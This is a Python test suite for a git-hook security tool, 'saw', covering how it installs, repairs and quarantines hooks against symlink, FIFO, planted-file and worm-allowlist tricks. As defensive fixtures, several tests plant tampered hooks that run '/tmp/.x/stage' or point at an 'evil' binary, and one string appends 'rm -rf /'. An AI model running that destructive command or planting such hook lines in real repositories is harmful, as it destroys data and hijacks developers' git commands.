        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(victim.read_text(), "precious\n")
        self.assertEqual(oct(victim.stat().st_mode & 0o777), oct(0o600))
        self.assertFalse((user_tpl / "hooks" / "post-merge").is_symlink())
        self.assertEqual(hook.hookscript.verdict(user_tpl / "hooks" / "post-merge", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)

    def test_the_mode_of_a_written_hook_is_set_on_the_open_file_never_by_name(self):
        hooks = self.home / "hooks"
        hooks.mkdir()
        with mock.patch("os.chmod", side_effect=AssertionError("chmod by name")), \
                mock.patch("os.lchmod", side_effect=AssertionError("chmod by name"), create=True):
            self.assertTrue(hook._write_verified(hooks / "post-merge", "#!/bin/sh\n", hooks))
        self.assertTrue(os.access(hooks / "post-merge", os.X_OK))

    def test_a_hook_saw_seeded_that_is_gone_is_restored(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))
        for event in hook._HOOKS:
            (repo / ".git" / "hooks" / event).unlink()
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        for event in hook._HOOKS:
            self.assertEqual(hook.hookscript.verdict(repo / ".git" / "hooks" / event, (hook._saw_executable(), None)),
                             hook.hookscript.PRISTINE)
        self.assertIn(f"restored: {repo / '.git' / 'hooks' / 'post-checkout'}", text)
        self.assertEqual(_quarantined(self.home), [])

    def test_uninstall_never_lets_a_chained_hook_overwrite_one_it_could_not_move_aside(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        theirs = user_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        self.assertEqual(self._quiet(hook.install)[0], 0)
        altered = theirs.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n")
        theirs.write_text(altered)
        root = hook.hookscript.quarantine_dir()
        root.parent.mkdir(parents=True)
        root.write_text("not a directory\n")
        code, text = self._quiet(hook.uninstall)
        self.assertEqual(code, 3, text)
        self.assertEqual(theirs.read_text(), altered)
        self.assertEqual((user_tpl / "hooks" / "post-checkout.local").read_text(), "#!/bin/sh\necho theirs\n")

    def test_a_pipe_named_like_a_hook_is_never_opened(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        os.mkfifo(managed / "post-checkout")
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.FOREIGN)
        self.assertFalse(hook.hookscript.is_ours(managed / "post-checkout"))
        self.assertEqual(hook.hookscript.altered_hooks(), [managed / "post-checkout"])
        code, text = self._quiet(hook.status)
        self.assertEqual(code, 0)
        self.assertIn("saw hook repair", text)

    def test_a_linked_hooks_directory_is_refused_whole(self):
        elsewhere = self.home / "Documents"
        elsewhere.mkdir()
        (elsewhere / "thesis.txt").write_text("years\n")
        (self.home / ".config" / "saw" / "git-template").mkdir(parents=True)
        os.symlink(elsewhere, self._managed())
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text)
        self.assertIn("could not verify", text)
        self.assertEqual((elsewhere / "thesis.txt").read_text(), "years\n")
        self.assertEqual(sorted(p.name for p in elsewhere.iterdir()), ["thesis.txt"])
        self.assertEqual(_quarantined(self.home), [])

    def test_a_linked_hook_of_the_operators_is_chained_without_touching_its_target(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        key = self.home / "id_rsa"
        key.write_text("SECRET\n")
        os.chmod(key, 0o600)
        os.symlink(key, user_tpl / "hooks" / "post-checkout")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(oct(key.stat().st_mode & 0o777), oct(0o600))
        self.assertEqual(key.read_text(), "SECRET\n")
        self.assertTrue((user_tpl / "hooks" / "post-checkout.local").is_symlink())

    def test_an_unreadable_hooks_directory_ends_with_a_verdict_not_a_traceback(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        os.chmod(managed, 0)
        self.addCleanup(os.chmod, managed, 0o700)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text + err.getvalue())
        self.assertNotIn("Traceback", err.getvalue())
        hook.hookscript.declare(hook._saw_executable(), None)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text + err.getvalue())
        self.assertNotIn("Traceback", err.getvalue())

    def test_install_records_what_it_installed_and_repair_refuses_to_guess(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        self.assertEqual(hook.hookscript.installed(), (hook._saw_executable(), str(cfg)))
        hook.hookscript.declaration_path().unlink()
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 2)
        self.assertIn("saw hook install", err.getvalue())
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        self.assertEqual(self._quiet(hook.uninstall)[0], 0)
        self.assertIsNone(hook.hookscript.installed())
        self.assertFalse(hook.hookscript.cache_path().exists())

    def test_a_hook_of_yours_that_mentions_saw_is_yours(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        mine = repo / ".git" / "hooks" / "pre-push"
        mine.write_text(f"#!/bin/sh\n# copied from {hook._MARKER}, adapted by me\necho mine\n")
        os.chmod(mine, 0o755)
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))
        self.assertEqual(hook.hookscript.verdict(mine), hook.hookscript.FOREIGN)
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        header = hook.hookscript.render("post-merge", "/x/saw", None).splitlines()[1]
        self.assertTrue(hook.hookscript.claims_ours(header + "\nrm -rf /\n"))

    def test_a_long_path_is_printed_whole(self):
        deep = self._managed()
        for i in range(12):
            deep = deep / f"a-very-long-directory-name-number-{i:02d}-padding-padding"
        deep.mkdir(parents=True)
        (deep / "stray").write_text("x\n")
        self.assertGreater(len(str(deep / "stray")), 300)
        with mock.patch("stayawake.bots.security.hookscript.hooks_dir", return_value=deep), \
                mock.patch("stayawake.bots.security.hook._hooks_dir", return_value=deep):
            code, text = self._quiet(hook.install)
        self.assertIn(str(deep / "stray"), text)


class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _seed(self, repo: Path) -> None:
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        known = json.loads(cache.read_text()) if cache.exists() else {}
        known[str(repo)] = "abc"
        cache.write_text(json.dumps(known))

    def test_a_repository_whose_hooks_path_runs_elsewhere_gets_nothing_written(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        (repo / ".husky").mkdir()
        (repo / ".husky" / "pre-commit").write_text("#!/bin/sh\nnpx lint-staged\n")
        _run(repo, "config", "core.hooksPath", ".husky")
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "husky")
        self._seed(repo)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(sorted(p.name for p in (repo / ".husky").iterdir()), ["pre-commit"])
        self.assertEqual(subprocess.run(["git", "-C", str(repo), "status", "--porcelain"],
                                        capture_output=True, text=True).stdout, "")
        self.assertIn(f"left: {repo}", text)
        _run(repo, "config", "core.hooksPath", "/dev/null")
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn("could not verify", text)

    def test_a_removed_hooks_directory_is_seeded_again(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        __import__("shutil").rmtree(repo / ".git" / "hooks")
        self._seed(repo)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn("restored:", text)
        self.assertEqual(sorted(p.name for p in (repo / ".git" / "hooks").iterdir()), sorted(hook._HOOKS))

    def test_repair_puts_back_the_saw_that_was_recorded_not_the_one_in_the_path(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        recorded = hook.hookscript.installed()
        other = self.home / "bin" / "saw"
        other.parent.mkdir()
        other.write_text("#!/bin/sh\n")
        os.chmod(other, 0o755)
        with mock.patch("stayawake.bots.security.hook._saw_executable", return_value=str(other)):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn("updated:", text)
        self.assertEqual(_quarantined(self.home), [])
        self.assertEqual(hook.hookscript.installed(), recorded)
        gone = self.home / "gone" / "saw"
        hook.hookscript.declaration_path().write_text(json.dumps({"saw": str(gone), "config": None}))
        for event in hook._HOOKS:
            (hook._hooks_dir() / event).write_text(hook.hookscript.render(event, str(gone), None))
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(text.count("updated:"), 3)
        self.assertIn(hook._saw_executable(), (hook._hooks_dir() / "post-merge").read_text())

    def test_a_recorded_config_that_is_gone_stops_repair_and_is_named_by_status(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        cfg.unlink()
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.repair)
        self.assertEqual(code, 2)
        self.assertIn(str(cfg), err.getvalue())
        self.assertIn(str(cfg), self._quiet(hook.status)[1])
        self.assertIn(str(cfg), (hook._hooks_dir() / "post-merge").read_text())

    def test_without_a_record_a_hook_naming_another_config_is_not_an_alarm(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        managed.mkdir(parents=True)
        for event in hook._HOOKS:
            p = managed / event
            p.write_text(hook.hookscript.render(event, hook._saw_executable(), str(self.home / "old.yml")))
            os.chmod(p, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(managed.parent)])
        self.assertIsNone(hook.hookscript.installed())
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        text = self._quiet(hook.status)[1]
        self.assertIn("no record", text)
        self.assertNotIn("not what saw installs", text)
        (managed / "post-merge").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertEqual(hook.hookscript.altered_hooks(), [managed / "post-merge"])


class TestTheRecordIsTheOnlyAuthority(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def _seed(self, repo: Path) -> None:
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(repo): "abc"}))

    def test_a_repository_whose_git_directory_is_a_link_gets_nothing_written(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        victim = _repo({"v.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(victim, ignore_errors=True))
        for event in hook._HOOKS:
            (victim / ".git" / "hooks" / event).unlink(missing_ok=True)
        decoy = self.home / "decoy"
        decoy.mkdir()
        os.symlink(victim / ".git", decoy / ".git")
        self._seed(decoy)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text)
        self.assertIn("could not verify", text)
        self.assertEqual([e for e in hook._HOOKS if (victim / ".git" / "hooks" / e).exists()], [])

    def test_a_same_name_of_another_case_is_never_counted_as_the_hook(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        odd = managed / "Post-Checkout"
        odd.write_text(hook.hookscript.render("post-checkout", hook._saw_executable(), None))
        os.chmod(odd, 0o755)
        if not (managed / "post-checkout").exists():
            self.skipTest("this filesystem tells the two names apart")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertIn("post-checkout", os.listdir(managed))
        self.assertNotIn("Post-Checkout", os.listdir(managed))
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)
        self.assertEqual(len(_quarantined(self.home)), 1)

    def test_a_hook_of_saws_own_that_is_gone_is_reported(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        (self._managed() / "post-checkout").unlink()
        self.assertEqual(hook.hookscript.altered_hooks(), [self._managed() / "post-checkout"])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.altered_hooks(), [])

    def test_a_recorded_saw_that_cannot_run_is_reported(self):
        mine = self.home / "bin" / "saw"
        mine.parent.mkdir()
        mine.write_text("#!/bin/sh\n")
        os.chmod(mine, 0o755)
        with mock.patch("stayawake.bots.security.hook._saw_executable", return_value=str(mine)):
            self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertTrue(hook.hookscript.recorded_saw_runs())
        self.assertNotIn("cannot run", self._quiet(hook.status)[1])
        os.chmod(mine, 0o644)
        self.assertFalse(hook.hookscript.recorded_saw_runs())
        self.assertIn("cannot run", self._quiet(hook.status)[1])
        mine.unlink()
        self.assertFalse(hook.hookscript.recorded_saw_runs())
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertTrue(hook.hookscript.recorded_saw_runs())

    def test_a_link_to_nothing_is_never_chained(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        os.symlink("post-merge", user_tpl / "hooks" / "post-merge")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse(os.path.lexists(user_tpl / "hooks" / "post-merge.local"))
        self.assertEqual(hook.hookscript.verdict(user_tpl / "hooks" / "post-merge", hook.hookscript.installed()),
                         hook.hookscript.PRISTINE)
        (kept,) = _quarantined(self.home)
        self.assertTrue((kept / "kept" / "post-merge").is_symlink())

    def test_repair_settles_the_template_directory_the_record_names_and_no_other(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertEqual(hook.hookscript.installed_into(), user_tpl / "hooks")
        other = self.home / "other-template"
        (other / "hooks").mkdir(parents=True)
        planted = other / "hooks" / "post-checkout"
        planted.write_text(hook.hookscript.render("post-checkout", str(self.home / "evil" / "saw"), None))
        os.chmod(planted, 0o755)
        theirs = other / "hooks" / "post-merge"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(other)])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn(f"updated: {planted}", text)
        self.assertNotIn(str(self.home / "evil" / "saw"), planted.read_text())
        self.assertEqual(theirs.read_text(), "#!/bin/sh\necho theirs\n")
        self.assertEqual(sorted(p.name for p in (other / "hooks").iterdir()), ["post-checkout", "post-merge"])
        altered = user_tpl / "hooks" / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn(f"repaired: {altered}", text)

    def test_install_always_sweeps_saws_own_directory(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout.local"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse(planted.exists())
        self.assertIn(f"quarantined: {planted}", text)

    def test_uninstall_keeps_a_stale_hook_aside(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        stale = self._managed() / "post-merge"
        stale.write_text(hook.hookscript.render("post-merge", str(self.home / "evil" / "saw"), None))
        code, text = self._quiet(hook.uninstall)
        self.assertEqual(code, 0, text)
        (kept,) = _quarantined(self.home)
        self.assertIn(str(self.home / "evil" / "saw"), (kept / "kept" / "post-merge").read_text())

    def test_a_record_that_is_a_link_or_relative_is_refused(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        record = hook.hookscript.declaration_path()
        record.write_text(json.dumps({"saw": "saw", "config": None}))
        self.assertIsNone(hook.hookscript.installed())
        record.unlink()
        elsewhere = self.home / "elsewhere.json"
        elsewhere.write_text("keep\n")
        os.symlink(elsewhere, record)
        self.assertFalse(hook.hookscript.declare("/usr/local/bin/saw", None))
        self.assertEqual(elsewhere.read_text(), "keep\n")
        self.assertIsNone(hook.hookscript.installed())

    def test_status_and_repair_agree_on_where_saws_hooks_run(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        moved = self.home / "dotfiles" / "git-template"
        __import__("shutil").copytree(self._managed().parent, moved)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(moved)])
        altered = moved / "hooks" / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        self.assertEqual(hook.hookscript.altered_hooks(), [altered])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn(f"repaired: {altered}", text)
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])

    def test_a_seeded_repository_whose_saw_hooks_are_all_gone_is_reported(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        self._seed(repo)
        for event in hook._HOOKS:
            (repo / ".git" / "hooks" / event).unlink()
        self.assertEqual(sorted(hook.hookscript.altered_hooks()), sorted(repo / ".git" / "hooks" / e for e in hook._HOOKS))
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])

    def test_what_saw_keeps_for_itself_is_never_a_hooks_directory(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        for kept in (hook.hookscript.quarantine_dir(), hook.hookscript.quarantine_dir() / "x"):
            kept.mkdir(parents=True, exist_ok=True)
            self.assertEqual(hook._repair_repository(kept, hook._saw_executable(), None)[0].state, hook.UNVERIFIED)
            self.assertEqual(hook._settle(kept, hook._saw_executable(), None, own=False)[0].state, hook.UNVERIFIED)
            self.assertEqual(list(kept.iterdir()), [])

    def test_a_dotfiles_layout_keeps_its_record(self):
        real = self.home / "dotfiles" / "saw"
        real.mkdir(parents=True)
        (self.home / ".config").mkdir()
        os.symlink(real, self.home / ".config" / "saw")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertIsNotNone(hook.hookscript.installed())
        self.assertEqual(self._quiet(hook.repair)[0], 0)

    def test_another_spelling_of_saws_own_directory_is_still_saws_own(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        spelled = managed.parent.parent / "Git-Template"
        if not spelled.exists():
            self.skipTest("this filesystem tells the two names apart")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(spelled)])
        planted = managed / "post-checkout"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        os.chmod(planted, 0o755)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout.local").exists())
        self.assertEqual(hook._template_dirs()[1:], [])
        self.assertEqual(len(_quarantined(self.home)), 1)

    def test_a_relative_template_path_is_refused_before_anything_is_written(self):
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", "my-template"])
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 2)
        self.assertIn("relative", err.getvalue())
        self.assertFalse((Path.cwd() / "my-template").exists())


class TestQuarantine(_Isolated):
    def test_a_dangling_link_is_moved_and_counted_as_moved(self):
        link = self.home / "hooks" / "post-checkout"
        link.parent.mkdir()
        os.symlink(self.home / "nowhere", link)
        folder = hook.hookscript.quarantine(link)
        self.assertIsNotNone(folder)
        self.assertFalse(os.path.lexists(link))
        self.assertTrue((folder / "kept" / "post-checkout").is_symlink())

    def test_a_planted_record_name_cannot_replace_the_record(self):
        planted = self.home / "hooks" / "origin.json"
        planted.parent.mkdir()
        planted.write_text('{"planted": true}\n')
        folder = hook.hookscript.quarantine(planted)
        self.assertEqual((folder / "kept" / "origin.json").read_text(), '{"planted": true}\n')
        self.assertEqual(json.loads((folder / "origin.json").read_text())["path"], str(planted))

    def test_what_is_moved_aside_is_kept_whole_with_its_origin(self):
        victim = self.home / "hooks" / "pre-push"
        victim.parent.mkdir()
        victim.write_bytes(b"#!/bin/sh\n\x00payload\n")
        os.chmod(victim, 0o755)
        folder = hook.hookscript.quarantine(victim)
        self.assertIsNotNone(folder)
        self.assertFalse(victim.exists())
        self.assertEqual((folder / "kept" / "pre-push").read_bytes(), b"#!/bin/sh\n\x00payload\n")
        record = json.loads((folder / "origin.json").read_text())
        self.assertEqual(record["path"], str(victim))
        self.assertEqual(record["size"], 19)
        self.assertEqual(record["mode"], oct(0o100755))
        self.assertIsNone(record["symlink_target"])

    def test_a_symlink_is_moved_as_a_link_and_a_directory_whole(self):
        target = self.home / "elsewhere.sh"
        target.write_text("echo target\n")
        link = self.home / "hooks" / "lib.sh"
        link.parent.mkdir()
        os.symlink(target, link)
        folder = hook.hookscript.quarantine(link)
        self.assertTrue((folder / "kept" / "lib.sh").is_symlink())
        self.assertTrue(target.exists())
        self.assertEqual(json.loads((folder / "origin.json").read_text())["symlink_target"], str(target))
        nested = self.home / "hooks" / "lib"
        (nested / "deep").mkdir(parents=True)
        (nested / "deep" / "x.sh").write_text("x\n")
        folder = hook.hookscript.quarantine(nested)
        self.assertFalse(nested.exists())
        self.assertEqual((folder / "kept" / "lib" / "deep" / "x.sh").read_text(), "x\n")

    def test_a_quarantine_that_cannot_hold_the_file_leaves_it_where_it_is(self):
        victim = self.home / "hooks" / "pre-push"
        victim.parent.mkdir()
        victim.write_text("x\n")
        root = hook.hookscript.quarantine_dir()
        root.parent.mkdir(parents=True)
        os.symlink(self.home / "hooks", root)
        self.assertIsNone(hook.hookscript.quarantine(victim))
        self.assertEqual(victim.read_text(), "x\n")

    def test_two_files_of_one_name_moved_in_one_second_are_both_kept(self):
        a = self.home / "a" / "post-merge"
        b = self.home / "b" / "post-merge"
        for p, body in ((a, "a\n"), (b, "b\n")):
            p.parent.mkdir()
            p.write_text(body)
        fa = hook.hookscript.quarantine(a)
        fb = hook.hookscript.quarantine(b)
        self.assertNotEqual(fa, fb)
        self.assertEqual({(fa / "kept" / "post-merge").read_text(), (fb / "kept" / "post-merge").read_text()}, {"a\n", "b\n"})


class TestHookScript(unittest.TestCase):
    def test_generated_hook_is_valid_posix_sh_with_awkward_paths(self):
        # A saw/config path with a space + `$` must not break or shell-expand — shlex.quote guards it.
        s = hook._hook_script("post-checkout", "/opt/my saw$dir/saw", "/home/op/c f.yml")
        r = subprocess.run(["sh", "-n"], input=s, text=True, capture_output=True)  # parse-only
        self.assertEqual(r.returncode, 0, f"generated hook is not valid sh:\n{s}\n{r.stderr}")
        self.assertIn(hook._MARKER, s)
        self.assertIn("post-checkout.local", s)                      # chains to a preserved hook
        self.assertTrue(s.rstrip().endswith("exit 0"))               # never fails the git command

    def test_hook_script_has_no_config_flag_when_none(self):
        s = hook._hook_script("post-merge", "/usr/local/bin/saw", None)
        self.assertNotIn("--config", s)

    def test_generated_hook_does_not_bake_no_stream(self):
        s = hook._hook_script("post-checkout", "/usr/local/bin/saw", None)
        self.assertNotIn("--no-stream", s)

    def test_remediation_commands_use_a_distinct_colour(self):
        from stayawake.utils.render import LINK, SEVERITY
        with mock.patch.object(hook, "supports_color", return_value=True):
            cmd = hook._cmd("saw scan /x", sys.stdout)          # a remediation command
            label = hook._paint("Inspect:", "dim", sys.stdout)  # surrounding prose
        self.assertIn(LINK, cmd)                                # command in the LINK colour…
        self.assertNotIn(LINK, label)                           # …distinct from the dim prose
        self.assertIn(SEVERITY["info"], label)


class TestTrustModel(_Isolated):
    def test_cloned_repos_own_allowlist_is_ignored(self):
        # THE trust invariant: a worm ships a config/security.yml whose allowlist would whitelist its
        # own payload. The hook must scan with the OPERATOR's policy (here: none) and STILL flag it.
        repo = _repo({
            ".gitignore": _INFECTED,
            "config/security.yml": "allowlist:\n  - signature: gitignore-autopush-markers\n",
        })
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        # config_path=None → operator has no allowlist → the finding is NOT suppressed.
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 1)


if __name__ == "__main__":
    unittest.main()
